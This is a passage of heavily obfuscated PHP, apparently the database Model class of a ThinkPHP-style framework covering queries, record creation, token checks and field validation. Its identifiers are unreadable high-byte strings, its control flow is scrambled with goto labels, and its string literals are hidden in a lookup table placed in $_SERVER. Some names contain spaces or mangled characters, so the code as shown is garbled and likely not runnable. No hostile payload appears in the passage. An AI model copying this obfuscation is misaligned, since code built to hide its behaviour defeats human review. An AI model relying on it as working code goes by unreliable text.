Aˆ÷³ïÙî›; Aˆ÷³ïÙî›: if (isset($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[273]]) && is_array($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[273]]) && !empty($Fß•ïÚÇ¤) && !isset($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[280]]) && !isset($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[277]])) { foreach ($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[273]] as $F½„«ˆŒ‰¯ => $EÂ­¤¼‹´) { $F½„«ˆŒ‰¯ = trim($F½„«ˆŒ‰¯); if (in_array($F½„«ˆŒ‰¯, $Fß•ïÚÇ¤, !0)) { if (is_scalar($EÂ­¤¼‹´)) { $this->_parseType($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[273]], $F½„«ˆŒ‰¯); } } elseif (!is_numeric($F½„«ˆŒ‰¯) && $fÚŸ”²Í˜º[71] != substr($F½„«ˆŒ‰¯, 0, 1) && !1 === strpos($F½„«ˆŒ‰¯, $fÚŸ”²Í˜º[95]) && !1 === strpos($F½„«ˆŒ‰¯, $fÚŸ”²Í˜º[258]) && !1 === strpos($F½„«ˆŒ‰¯, $fÚŸ”²Í˜º[281]) && !1 === strpos($F½„«ˆŒ‰¯, $fÚŸ”²Í˜º[282])) { unset($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[273]][$F½„«ˆŒ‰¯]); } } } $this->_options_filter($a ×ÊÃ„õ´); return $a ×ÊÃ„õ´; goto BÛªàø†; c°Üòãø‡¥: $fÚŸ”²Í˜º =& $_SERVER[Ö‘Øù]; if (is_array($a ×ÊÃ„õ´)) { $a ×ÊÃ„õ´ = array_merge($this->options, $a ×ÊÃ„õ´); } $this->options = array(); goto c¢ƒ–‹¨å; BÛªàø†: } protected function _options_filter(&$EÉá›ŞšÂ) { } protected function _parseType(&$C¾ä£Ì‰‘©, $C¿çœé‹ä) { $EÕš»ëº·½ =& $_SERVER[Ö‘Øù]; if (empty($this->options[$EÕš»ëº·½[283]][$EÕš»ëº·½[4] . $C¿çœé‹ä])) { $eèŞÆÆ»ôè = strtolower($this->fields[$EÕš»ëº·½[250]][$C¿çœé‹ä]); if (!1 !== strpos($eèŞÆÆ»ôè, $EÕš»ëº·½[284])) { } elseif (!1 === strpos($eèŞÆÆ»ôè, $EÕš»ëº·½[285]) && !1 !== strpos($eèŞÆÆ»ôè, $EÕš»ëº·½[286])) { $C¾ä£Ì‰‘©[$C¿çœé‹ä] = intval($C¾ä£Ì‰‘©[$C¿çœé‹ä]); } elseif (!1 !== strpos($eèŞÆÆ»ôè, $EÕš»ëº·½[287]) || !1 !== strpos($eèŞÆÆ»ôè, $EÕš»ëº·½[288])) { $C¾ä£Ì‰‘©[$C¿çœé‹ä] = floatval($C¾ä£Ì‰‘©[$C¿çœé‹ä]); } elseif (!1 !== strpos($eèŞÆÆ»ôè, $EÕš»ëº·½[289])) { $C¾ä£Ì‰‘©[$C¿çœé‹ä] = (bool) $C¾ä£Ì‰‘©[$C¿çœé‹ä]; } } } public function find($DàÄ¯¼õÑí = array()) { goto bæĞ‚†Ÿ¥‰; bæĞ‚†Ÿ¥‰: $a™³Õ«²î =& $_SERVER[Ö‘Øù]; if (is_numeric($DàÄ¯¼õÑí) || is_string($DàÄ¯¼õÑí)) { $bÖš˜Æ„º‰[$this->getPk()] = intval($DàÄ¯¼õÑí); $this->options[$a™³Õ«²î[273]] = $bÖš˜Æ„º‰; } $this->options[$a™³Õ«²î[290]] = 1; goto FµšÁÃœÚ»; dö¯ëæÜ: if (empty($bÆ×„æçéñ)) { return null; } $this->data = $bÆ×„æçéñ[0]; $this->_afterFind($this->data, $DàÄ¯¼õÑí); goto fÏ‡¤İ²ë; FµšÁÃœÚ»: $DàÄ¯¼õÑí = $this->_parseOptions(); $bÆ×„æçéñ = $this->db->select($DàÄ¯¼õÑí); if (!1 === $bÆ×„æçéñ) { return !1; } goto dö¯ëæÜ; fÏ‡¤İ²ë: if (!empty($this->options[$a™³Õ«²î[291]])) { return $this->returnResult($this->data, $this->options[$a™³Õ«²î[291]]); } return $this->data; goto EÚ„Æ›ë¯; EÚ„Æ›ë¯: } protected function _afterFind(&$e’˜”Ô„•è, $c‰¿ÙñÔ‡Ï) { } protected function returnResult($EĞ’åå¡Ã, $a÷ßÏ´Î‹ = '') { $EÎ¡‚¾ÑäÈ =& $_SERVER[Ö‘Øù]; if ($a÷ßÏ´Î‹) { if (is_callable($a÷ßÏ´Î‹)) { return call_user_func($a÷ßÏ´Î‹, $EĞ’åå¡Ã); } switch (strtolower($a÷ßÏ´Î‹)) { case $EÎ¡‚¾ÑäÈ[292]: return json_encode($EĞ’åå¡Ã); case $EÎ¡‚¾ÑäÈ[293]: return xml_encode($EĞ’åå¡Ã); } } return $EĞ’åå¡Ã; } public function parseFieldsMap($E£çŞ×Ùõ‡, $e ­êĞ×« = 1) { if (!empty($this->_map)) { foreach ($this->_map as $a†òÑçÒ°œ => $còéê¢ö‰²) { if ($e ­êĞ×« == 1) { if (isset($E£çŞ×Ùõ‡[$còéê¢ö‰²])) { $E£çŞ×Ùõ‡[$a†òÑçÒ°œ] = $E£çŞ×Ùõ‡[$còéê¢ö‰²]; unset($E£çŞ×Ùõ‡[$còéê¢ö‰²]); } } else { if (isset($E£çŞ×Ùõ‡[$a†òÑçÒ°œ])) { $E£çŞ×Ùõ‡[$còéê¢ö‰²] = $E£çŞ×Ùõ‡[$a†òÑçÒ°œ]; unset($E£çŞ×Ùõ‡[$a†òÑçÒ°œ]); } } } } return $E£çŞ×Ùõ‡; } public function setField($d¯Ïà¢ÜŒ, $fÇİÛÅ÷· = '') { if (is_array($d¯Ïà¢ÜŒ)) { $döµäˆíæ³ = $d¯Ïà¢ÜŒ; } else { $döµäˆíæ³[$d¯Ïà¢ÜŒ] = $fÇİÛÅ÷·; } return $this->save($döµäˆíæ³); } public function setAdd($B¥ÎŠ‘°¨, $C›ÔŒêŸšÕ = 1) { $dáÅõ…¤† =& $_SERVER[Ö‘Øù]; $C…ÍÛµ£¦ = $B¥ÎŠ‘°¨ . $dáÅõ…¤†[294] . $C›ÔŒêŸšÕ; if ($C›ÔŒêŸšÕ < 0) { $C…ÍÛµ£¦ = $B¥ÎŠ‘°¨ . $C›ÔŒêŸšÕ; } return $this->setField($B¥ÎŠ‘°¨, array($dáÅõ…¤†[295], $C…ÍÛµ£¦)); } public function getField($a‰†«¨ŠÈİ, $d¿‹Ñ«Û³ = null) { $BŸ×†ç³ =& $_SERVER[Ö‘Øù]; $BÅ†­Ô™ŠÃ[$BŸ×†ç³[271]] = $a‰†«¨ŠÈİ; $BÅ†­Ô™ŠÃ = $this->_parseOptions($BÅ†­Ô™ŠÃ); $a‰†«¨ŠÈİ = trim($a‰†«¨ŠÈİ); if (strpos($a‰†«¨ŠÈİ, $BŸ×†ç³[47])) { if (!isset($BÅ†­Ô™ŠÃ[$BŸ×†ç³[290]])) { $BÅ†­Ô™ŠÃ[$BŸ×†ç³[290]] = is_numeric($d¿‹Ñ«Û³) ? $d¿‹Ñ«Û³ : $BŸ×†ç³[33]; } $a‹¿ò¿‡„¦ = $this->db->select($BÅ†­Ô™ŠÃ); if (!empty($a‹¿ò¿‡„¦)) { goto FÙµ÷óÒ¿Ÿ; FÙµ÷óÒ¿Ÿ: $eô‡ğ™®Ô™ = explode($BŸ×†ç³[47], $a‰†«¨ŠÈİ); $a‰†«¨ŠÈİ = array_keys($a‹¿ò¿‡„¦[0]); $cÍ¼ Ğ´šƒ = array_shift($a‰†«¨ŠÈİ); goto c²¤Œ‰¿Õ; c²¤Œ‰¿Õ: $C‹óÅŸ¿¨Ğ = array_shift($a‰†«¨ŠÈİ); $Dä·‚„¾ë = array(); $AÙˆ”„ÙÒ = count($eô‡ğ™®Ô™); goto cİ²ğÇê¥¿; cİ²ğÇê¥¿: foreach ($a‹¿ò¿‡„¦ as $c³Ö˜Š×˜Ğ) { $e†§…­‚ö— = $c³Ö˜Š×˜Ğ[$cÍ¼ Ğ´šƒ]; if (2 == $AÙˆ”„ÙÒ) { $Dä·‚„¾ë[$e†§…­‚ö—] = $c³Ö˜Š×˜Ğ[$C‹óÅŸ¿¨Ğ]; } else { $Dä·‚„¾ë[$e†§…­‚ö—] = is_string($d¿‹Ñ«Û³) ? implode($d¿‹Ñ«Û³, $c³Ö˜Š×˜Ğ) : $c³Ö˜Š×˜Ğ; } } return $Dä·‚„¾ë; goto B¥î›¨§; B¥î›¨§: } } else { if (!0 !== $d¿‹Ñ«Û³) { $BÅ†­Ô™ŠÃ[$BŸ×†ç³[290]] = is_numeric($d¿‹Ñ«Û³) ? $d¿‹Ñ«Û³ : 1; } if ($d¿‹Ñ«Û³ === $BŸ×†ç³[253]) { unset($BÅ†­Ô™ŠÃ[$BŸ×†ç³[290]]); } $c³Ö˜Š×˜Ğ = $this->db->select($BÅ†­Ô™ŠÃ); if (!empty($c³Ö˜Š×˜Ğ)) { if ($d¿‹Ñ«Û³ === $BŸ×†ç³[253]) { return reset($c³Ö˜Š×˜Ğ[0]); } if (!0 !== $d¿‹Ñ«Û³ && 1 == $BÅ†­Ô™ŠÃ[$BŸ×†ç³[290]]) { return reset($c³Ö˜Š×˜Ğ[0]); } foreach ($c³Ö˜Š×˜Ğ as $FñÆÛŠ­¬ƒ) { $F§¡µ¤ÉæÜ[] = $FñÆÛŠ­¬ƒ[$a‰†«¨ŠÈİ]; } return $F§¡µ¤ÉæÜ; } } return null; } public function create($d¬ºŒõ«Ó¨ = '', $C†Š—Å±È = '') { goto EéƒÑÖÉ¤; e—·àÉ»ì©: $d¬ºŒõ«Ó¨ = $this->parseFieldsMap($d¬ºŒõ«Ó¨, 0); $C†Š—Å±È = $C†Š—Å±È ? $C†Š—Å±È : (!empty($d¬ºŒõ«Ó¨[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$B†è •å‡[271]])) { $d¬ÑãÏ÷Ñ = $this->options[$B†è •å‡[271]]; unset($this->options[$B†è •å‡[271]]); } elseif ($C†Š—Å±È == THINK_MODEL_INSERT && isset($this->insertFields)) { $d¬ÑãÏ÷Ñ = $this->insertFields; } elseif ($C†Š—Å±È == THINK_MODEL_UPDATE && isset($this->updateFields)) { $d¬ÑãÏ÷Ñ = $this->updateFields; } goto dÓ´‰ÛïğÔ; Cäº®ùŸ§Ã: if ($this->autoCheckFields) { $d¬ÑãÏ÷Ñ = $this->getDbFields(); foreach ($d¬ºŒõ«Ó¨ as $Cñ¢†¬©  => $b‡ñ¥²è¿¦) { if (!in_array($Cñ¢†¬© , $d¬ÑãÏ÷Ñ)) { unset($d¬ºŒõ«Ó¨[$Cñ¢†¬© ]); } elseif (MAGIC_QUOTES_GPC && is_string($b‡ñ¥²è¿¦)) { $d¬ºŒõ«Ó¨[$Cñ¢†¬© ] = stripslashes($b‡ñ¥²è¿¦); } } } $this->autoOperation($d¬ºŒõ«Ó¨, $C†Š—Å±È); $this->data = $d¬ºŒõ«Ó¨; goto FãÕ¤„ã‘‡; EéƒÑÖÉ¤: $B†è •å‡ =& $_SERVER[Ö‘Øù]; if (empty($d¬ºŒõ«Ó¨)) { $d¬ºŒõ«Ó¨ = $_POST; } elseif (is_object($d¬ºŒõ«Ó¨)) { $d¬ºŒõ«Ó¨ = get_object_vars($d¬ºŒõ«Ó¨); } if (empty($d¬ºŒõ«Ó¨) || !is_array($d¬ºŒõ«Ó¨)) { $this->error = think_lang($B†è •å‡[269]); return !1; } goto e—·àÉ»ì©; dÓ´‰ÛïğÔ: if (isset($d¬ÑãÏ÷Ñ)) { if (is_string($d¬ÑãÏ÷Ñ)) { $d¬ÑãÏ÷Ñ = explode($B†è •å‡[47], $d¬ÑãÏ÷Ñ); } if (think_config($B†è •å‡[296])) { $d¬ÑãÏ÷Ñ[] = think_config($B†è •å‡[297]); } foreach ($d¬ºŒõ«Ó¨ as $Cñ¢†¬©  => $b‡ñ¥²è¿¦) { if (!in_array($Cñ¢†¬© , $d¬ÑãÏ÷Ñ)) { unset($d¬ºŒõ«Ó¨[$Cñ¢†¬© ]); } } } if (!$this->autoValidation($d¬ºŒõ«Ó¨, $C†Š—Å±È)) { return !1; } if (!$this->autoCheckToken($d¬ºŒõ«Ó¨)) { $this->error = think_lang($B†è •å‡[298]); return !1; } goto Cäº®ùŸ§Ã; FãÕ¤„ã‘‡: return $d¬ºŒõ«Ó¨; goto c…¢ŸÌÂ·‚; c…¢ŸÌÂ·‚: } public function autoCheckToken($aêì¨•¾ŠÌ) { $Aë…¤Ç¾…® =& $_SERVER[Ö‘Øù]; if (isset($this->options[$Aë…¤Ç¾…®[299]]) && !$this->options[$Aë…¤Ç¾…®[299]]) { return !0; } if (think_config($Aë…¤Ç¾…®[296])) { $eØœ‹Ïƒ = think_config($Aë…¤Ç¾…®[297]); if (!isset($aêì¨•¾ŠÌ[$eØœ‹Ïƒ]) || Session::get($eØœ‹Ïƒ)) { return !1; } list($d˜­¨ ÎìÏ, $bŠˆµÄùÕŒ) = explode($Aë…¤Ç¾…®[71], $aêì¨•¾ŠÌ[$eØœ‹Ïƒ]); if ($bŠˆµÄùÕŒ && Session::get($eØœ‹Ïƒ . $Aë…¤Ç¾…®[95] . $d˜­¨ ÎìÏ) === $bŠˆµÄùÕŒ) { Session::remove($eØœ‹Ïƒ . $Aë…¤Ç¾…®[95] . $d˜­¨ ÎìÏ); return !0; } if (think_config($Aë…¤Ç¾…®[300])) { Session::remove($eØœ‹Ïƒ . $Aë…¤Ç¾…®[95] . $d˜­¨ ÎìÏ); } return !1; } return !0; } public function regex($CÛï›—Ç, $bÅìÜ›¶Â) { $EŒšâÄ»ƒ… =& $_SERVER[Ö‘Øù]; $DÑ¶Ÿ÷¡Ã± = array($EŒšâÄ»ƒ…[301] => $EŒšâÄ»ƒ…[302], $EŒšâÄ»ƒ…[303] => $EŒšâÄ»ƒ…[304], $EŒšâÄ»ƒ…[305] => $EŒšâÄ»ƒ…[306], $EŒšâÄ»ƒ…[307] => $EŒšâÄ»ƒ…[308], $EŒšâÄ»ƒ…[309] => $EŒšâÄ»ƒ…[310], $EŒšâÄ»ƒ…[311] => $EŒšâÄ»ƒ…[312], $EŒšâÄ»ƒ…[313] => $EŒšâÄ»ƒ…[314], $EŒšâÄ»ƒ…[288] => $EŒšâÄ»ƒ…[315], $EŒšâÄ»ƒ…[316] => $EŒšâÄ»ƒ…[317]); if (isset($DÑ¶Ÿ÷¡Ã±[strtolower($bÅìÜ›¶Â)])) { $bÅìÜ›¶Â = $DÑ¶Ÿ÷¡Ã±[strtolower($bÅìÜ›¶Â)]; } return preg_match($bÅìÜ›¶Â, $CÛï›—Ç) === 1; } private function autoOperation(&$b´õ‰¹Óá, $BÕĞ…ñ¼¢ª) { $b‰¶™îÙòå =& $_SERVER[Ö‘Øù]; if (!empty($this->options[$b‰¶™îÙòå[318]])) { $a…ÖÖõİ°è = $this->options[$b‰¶™îÙòå[318]]; unset($this->options[$b‰¶™îÙòå[318]]); } elseif (!empty($this->_auto)) { $a…ÖÖõİ°è = $this->_auto; } if (isset($a…ÖÖõİ°è)) { foreach ($a…ÖÖõİ°è as $FŸéÓÏ×¯) { if (empty($FŸéÓÏ×¯[2])) { $FŸéÓÏ×¯[2] = THINK_MODEL_INSERT; } if ($BÕĞ…ñ¼¢ª == $FŸéÓÏ×¯[2] || $FŸéÓÏ×¯[2] == THINK_MODEL_BOTH) { switch (trim($FŸéÓÏ×¯[3])) { case $b‰¶™îÙòå[319]: case $b‰¶™îÙòå[320]: $dßåàù·‚ƒ = isset($FŸéÓÏ×¯[4]) ? (array) $FŸéÓÏ×¯[4] : array(); if (isset($b´õ‰¹Óá[$FŸéÓÏ×¯[0]])) { array_unshift($dßåàù·‚ƒ, $b´õ‰¹Óá[$FŸéÓÏ×¯[0]]); } if ($b‰¶™îÙòå[319] == $FŸéÓÏ×¯[3]) { $b´õ‰¹Óá[$FŸéÓÏ×¯[0]] = call_user_func_array($FŸéÓÏ×¯[1], $dßåàù·‚ƒ); } else { $b´õ‰¹Óá[$FŸéÓÏ×¯[0]] = call_user_func_array(array(&$this, $FŸéÓÏ×¯[1]), $dßåàù·‚ƒ); } break; case $b‰¶™îÙòå[271]: $b´õ‰¹Óá[$FŸéÓÏ×¯[0]] = $b´õ‰¹Óá[$FŸéÓÏ×¯[1]]; break; case $b‰¶™îÙòå[321]: if ($b‰¶™îÙòå[33] === $b´õ‰¹Óá[$FŸéÓÏ×¯[0]]) { unset($b´õ‰¹Óá[$FŸéÓÏ×¯[0]]); } break; case $b‰¶™îÙòå[322]: default: $b´õ‰¹Óá[$FŸéÓÏ×¯[0]] = $FŸéÓÏ×¯[1]; } if (!1 === $b´õ‰¹Óá[$FŸéÓÏ×¯[0]]) { unset($b´õ‰¹Óá[$FŸéÓÏ×¯[0]]); } } } } return $b´õ‰¹Óá; } protected function autoValidation($B“æ¬åÍŒÓ, $f‘Û¦‹Ìˆ) { $CÀ¿«„ÙÖ =& $_SERVER[Ö‘Øù]; if (!empty($this->options[$CÀ¿«„ÙÖ[323]])) { $D¿ÔêÎª‚ = $this->options[$CÀ¿«„ÙÖ[323]]; unset($this->options[$CÀ¿«„ÙÖ[323]]); } elseif (!empty($this->_validate)) { $D¿ÔêÎª‚ = $this->_validate; } if (isset($D¿ÔêÎª‚)) { if ($this->patchValidate) { $this->error = array(); } foreach ($D¿ÔêÎª‚ as $cµ¸ˆèâ => $F‘‰Ì´ô) { if (empty($F‘‰Ì´ô[5]) || $F‘‰Ì´ô[5] == THINK_MODEL_BOTH || $F‘‰Ì´ô[5] == $f‘Û¦‹Ìˆ) { if (0 == strpos($F‘‰Ì´ô[2], $CÀ¿«„ÙÖ[324]) && strpos($F‘‰Ì´ô[2], $CÀ¿«„ÙÖ[325])) { $F‘‰Ì´ô[2] = think_lang(substr($F‘‰Ì´ô[2], 2, -1)); } $F‘‰Ì´ô[3] = isset($F‘‰Ì´ô[3]) ? $F‘‰Ì´ô[3] : THINK_EXISTS_VALIDATE; $F‘‰Ì´ô[4] = isset($F‘‰Ì´ô[4]) ? $F‘‰Ì´ô[4] : $CÀ¿«„ÙÖ[326]; switch ($F‘‰Ì´ô[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($B“æ¬åÍŒÓ, $F‘‰Ì´ô)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($CÀ¿«„ÙÖ[33] != trim($B“æ¬åÍŒÓ[$F‘‰Ì´ô[0]])) { if (!1 === $this->_validationField($B“æ¬åÍŒÓ, $F‘‰Ì´ô)) { return !1; } } break; default: if (isset($B“æ¬åÍŒÓ[$F‘‰Ì´ô[0]])) { if (!1 === $this->_validationField($B“æ¬åÍŒÓ, $F‘‰Ì´ô)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($dÈ¬‰ÉáÙ, $EŒÆ¬…Ç§) { if (!1 === $this->_validationFieldItem($dÈ¬‰ÉáÙ, $EŒÆ¬…Ç§)) { if ($this->patchValidate) { $this->error[$EŒÆ¬…Ç§[0]] = $EŒÆ¬…Ç§[2]; } else { $this->error = $EŒÆ¬…Ç§[2]; return !1; } } return; } protected function _validationFieldItem($FÕõªÚ½‡, $eÕà‹Åáê) { $fÙ²äé«ô´ =& $_SERVER[Ö‘Øù]; switch (strtolower(trim($eÕà‹Åáê[4]))) { case $fÙ²äé«ô´[319]: case $fÙ²äé«ô´[320]: $bÓÃÃñ¢Ê = isset($eÕà‹Åáê[6]) ? (array) $eÕà‹Åáê[6] : array(); if (is_string($eÕà‹Åáê[0]) && strpos($eÕà‹Åáê[0], $fÙ²äé«ô´[47])) { $eÕà‹Åáê[0] = explode($fÙ²äé«ô´[47], $eÕà‹Åáê[0]); } if (is_array($eÕà‹Åáê[0])) { foreach ($eÕà‹Åáê[0] as $eò·…Ù¶»‹) { $AººÎèÖµà[$eò·…Ù¶»‹] = $FÕõªÚ½‡[$eò·…Ù¶»‹]; } array_unshift($bÓÃÃñ¢Ê, $AººÎèÖµà); } else { array_unshift($bÓÃÃñ¢Ê, $FÕõªÚ½‡[$eÕà‹Åáê[0]]); } if ($fÙ²äé«ô´[319] == $eÕà‹Åáê[4]) { return call_user_func_array($eÕà‹Åáê[1], $bÓÃÃñ¢Ê); } else { return call_user_func_array(array(&$this, $eÕà‹Åáê[1]), $bÓÃÃñ¢Ê); } case $fÙ²äé«ô´[327]: return $FÕõªÚ½‡[$eÕà‹Åáê[0]] == $FÕõªÚ½‡[$eÕà‹Åáê[1]]; case $fÙ²äé«ô´[328]: if (is_string($eÕà‹Åáê[0]) && strpos($eÕà‹Åáê[0], $fÙ²äé«ô´[47])) { $eÕà‹Åáê[0] = explode($fÙ²äé«ô´[47], $eÕà‹Åáê[0]); } $bÂ‚‹ÅÛÆ… = array(); if (is_array($eÕà‹Åáê[0])) { foreach ($eÕà‹Åáê[0] as $eò·…Ù¶»‹) { $bÂ‚‹ÅÛÆ…[$eò·…Ù¶»‹] = $FÕõªÚ½‡[$eò·…Ù¶»‹]; } } else { $bÂ‚‹ÅÛÆ…[$eÕà‹Åáê[0]] = $FÕõªÚ½‡[$eÕà‹Åáê[0]]; } if (!empty($FÕõªÚ½‡[$this->getPk()])) { $bÂ‚‹ÅÛÆ…[$this->getPk()] = array($fÙ²äé«ô´[329], $FÕõªÚ½‡[$this->getPk()]); } if ($this->where($bÂ‚‹ÅÛÆ…)->find()) { return !1; } return !0; default: return $this->check($FÕõªÚ½‡[$eÕà‹Åáê[0]], $eÕà‹Åáê[1], $eÕà‹Åáê[4]); } } public function check($d‚ø®‰ ¼, $f®ÙÜ×§·À, $B½Õ¨¾ëÍğ = "\162\145\x67\x65\x78") { $DÕ“Öë¨È =& $_SERVER[Ö‘Øù]; $B½Õ¨¾ëÍğ = strtolower(trim($B½Õ¨¾ëÍğ)); switch ($B½Õ¨¾ëÍğ) { case $DÕ“Öë¨È[7]: case $DÕ“Öë¨È[330]: $e³«µŒÖà¬ = is_array($f®ÙÜ×§·À) ? $f®ÙÜ×§·À : explode($DÕ“Öë¨È[47], $f®ÙÜ×§·À); return $B½Õ¨¾ëÍğ == $DÕ“Öë¨È[7] ? in_array($d‚ø®‰ ¼, $e³«µŒÖà¬) : !in_array($d‚ø®‰ ¼, $e³«µŒÖà¬); case $DÕ“Öë¨È[331]: case $DÕ“Öë¨È[332]: if (is_array($f®ÙÜ×§·À)) { $Fë­õù = $f®ÙÜ×§·À[0]; $bµˆª²ãŞ÷ = $f®ÙÜ×§·À[1]; } else { list($Fë­õù, $bµˆª²ãŞ÷) = explode($DÕ“Öë¨È[47], $f®ÙÜ×§·À); } return $B½Õ¨¾ëÍğ == $DÕ“Öë¨È[331] ? $d‚ø®‰ ¼ >= $Fë­õù && $d‚ø®‰ ¼ <= $bµˆª²ãŞ÷ : $d‚ø®‰ ¼ < $Fë­õù || $d‚ø®‰ ¼ > $bµˆª²ãŞ÷; case $DÕ“Öë¨È[333]: case $DÕ“Öë¨È[334]: return $B½Õ¨¾ëÍğ == $DÕ“Öë¨È[333] ? $d‚ø®‰ ¼ == $f®ÙÜ×§·À : $d‚ø®‰ ¼ != $f®ÙÜ×§·À; case $DÕ“Öë¨È[335]: $cÈÁâìÙä = mb_strlen($d‚ø®‰ ¼, $DÕ“Öë¨È[336]); if (strpos($f®ÙÜ×§·À, $DÕ“Öë¨È[47])) { list($Fë­õù, $bµˆª²ãŞ÷) = explode($DÕ“Öë¨È[47], $f®ÙÜ×§·À); return $cÈÁâìÙä >= $Fë­õù && $cÈÁâìÙä <= $bµˆª²ãŞ÷; } else { return $cÈÁâìÙä == $f®ÙÜ×§·À; } case $DÕ“Öë¨È[337]: list($dµ‡¼‚ ï, $Eé„…¤‡è) = explode($DÕ“Öë¨È[47], $f®ÙÜ×§·À); if (!is_numeric($dµ‡¼‚ ï)) { $dµ‡¼‚ ï = strtotime($dµ‡¼‚ ï); } if (!is_numeric($Eé„…¤‡è)) { $Eé„…¤‡è = strtotime($Eé„…¤‡è); } return NOW_TIME >= $dµ‡¼‚ ï && NOW_TIME <= $Eé„…¤‡è; case $DÕ“Öë¨È[338]: return in_array(get_client_ip(), explode($DÕ“Öë¨È[47], $f®ÙÜ×§·À)); case $DÕ“Öë¨È[339]: return !in_array(get_client_ip(), explode($DÕ“Öë¨È[47], $f®ÙÜ×§·À)); case $DÕ“Öë¨È[326]: default: return $this->regex($d‚ø®‰ ¼, $f®ÙÜ×§·À); } } public function query($C™Ä×¥…ˆÜ, $Eó‹°ÕİØ = false) { $CŸ í¬ñ®° =& $_SERVER[Ö‘Øù]; if (!is_bool($Eó‹°ÕİØ) && !is_array($Eó‹°ÕİØ)) { $Eó‹°ÕİØ = func_get_args(); array_shift($Eó‹°ÕİØ); } $C™Ä×¥…ˆÜ = str_replace(array($CŸ í¬ñ®°[229], $CŸ í¬ñ®°[340]), $CŸ í¬ñ®°[50], $C™Ä×¥…ˆÜ); $C™Ä×¥…ˆÜ = $this->parseSql($C™Ä×¥…ˆÜ, $Eó‹°ÕİØ); return $this->db->query($C™Ä×¥…ˆÜ); } public function execute($eÀùŒ±¤·, $c–˜”™è = false) { if (!is_bool($c–˜”™è) && !is_array($c–˜”™è)) { $c–˜”™è = func_get_args(); array_shift($c–˜”™è); } $eÀùŒ±¤· = $this->parseSql($eÀùŒ±¤·, $c–˜”™è); return $this->db->execute($eÀùŒ±¤·); } protected function parseSql($CùÇİ«³‹À, $dÓ¦‹‹¼á) { $CİØ»œ‚‹† =& $_SERVER[Ö‘Øù]; if (!0 === $dÓ¦‹‹¼á) { $eÛ­›¶Ô«· = $this->_parseOptions(); $CùÇİ«³‹À = $this->db->parseSql($CùÇİ«³‹À, $eÛ­›¶Ô«·); } elseif (is_array($dÓ¦‹‹¼á)) { $dÓ¦‹‹¼á = array_map(array($this->db, $CİØ»œ‚‹†[341]), $dÓ¦‹‹¼á); $CùÇİ«³‹À = vsprintf($CùÇİ«³‹À, $dÓ¦‹‹¼á); } else { $CùÇİ«³‹À = strtr($CùÇİ«³‹À, array($CİØ»œ‚‹†[342] => $this->getTableName(), $CİØ»œ‚‹†[343] => think_config($CİØ»œ‚‹†[242]))); } $this->db->setModel($this->name); return $CùÇİ«³‹À; } public function db($d–Ã¤Ôœóƒ = '', $eÓ†ß”­Ù½ = '', $e‘·‡…Ã× = array()) { goto c¤‘¢«¡¥; bİõ‚íà¢‚: static $A®—§Ş©Àå = array(); if (!isset($A®—§Ş©Àå[$d–Ã¤Ôœóƒ]) || isset($A®—§Ş©Àå[$d–Ã¤Ôœóƒ]) && $eÓ†ß”­Ù½ && $f™Ø½ ÉŞš[$d–Ã¤Ôœóƒ] != $eÓ†ß”­Ù½) { if (!empty($eÓ†ß”­Ù½) && is_string($eÓ†ß”­Ù½) && !1 === strpos($eÓ†ß”­Ù½, $AªÈæŸÆ„ø[8])) { $eÓ†ß”­Ù½ = think_config($eÓ†ß”­Ù½); } $A®—§Ş©Àå[$d–Ã¤Ôœóƒ] = Db::getInstance($eÓ†ß”­Ù½); } elseif (NULL === $eÓ†ß”­Ù½) { $A®—§Ş©Àå[$d–Ã¤Ôœóƒ]->close(); unset($A®—§Ş©Àå[$d–Ã¤Ôœóƒ]); return; } if (!empty($e‘·‡…Ã×)) { if (is_string($e‘·‡…Ã×)) { parse_str($e‘·‡…Ã×, $e‘·‡…Ã×); } foreach ($e‘·‡…Ã× as $EŠ¨Ù…”í => $F¯Ó½…Õ›æ) { $this->setProperty($EŠ¨Ù…”í, $F¯Ó½…Õ›æ); } } goto eŞÚâËéÊƒ; eŞÚâËéÊƒ: $f™Ø½ ÉŞš[$d–Ã¤Ôœóƒ] = $eÓ†ß”­Ù½; $this->db = $A®—§Ş©Àå[$d–Ã¤Ôœóƒ]; $this->_after_db(); goto dÏÆ‡™ÚŠŸ; dÏÆ‡™ÚŠŸ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A¥†„ª‚˜„; c¤‘¢«¡¥: $AªÈæŸÆ„ø =& $_SERVER[Ö‘Øù]; if ($AªÈæŸÆ„ø[33] === $d–Ã¤Ôœóƒ && $this->db) { return $this->db; } static $f™Ø½ ÉŞš = array(); goto bİõ‚íà¢‚; A¥†„ª‚˜„: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $a¼³Üš‘½ = get_class($this); if ($a¼³Üš‘½ == $_SERVER[Ö‘Øù][344]) { return $this->name; } $this->name = substr($a¼³Üš‘½, 0, -5); } return $this->name; } public function getTableName() { $eò×ÕÛÌö =& $_SERVER[Ö‘Øù]; if (empty($this->trueTableName)) { $c öèŠÓ‚ = !empty($this->tablePrefix) ? $this->tablePrefix : $eò×ÕÛÌö[33]; if (!empty($this->tableName)) { $c öèŠÓ‚ .= $this->tableName; } else { $c öèŠÓ‚ .= think_parse_name($this->name); } $this->trueTableName = strtolower($c öèŠÓ‚); } return (!empty($this->dbName) ? $this->dbName . $eò×ÕÛÌö[95] : $eò×ÕÛÌö[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $EÄá¸™Ä÷‰ =& $_SERVER[Ö‘Øù]; return isset($this->fields[$EÄá¸™Ä÷‰[249]]) ? $this->fields[$EÄá¸™Ä÷‰[249]] : $this->pk; } public function getDbFields() { $d¦… ¹¨ÅÄ =& $_SERVER[Ö‘Øù]; if 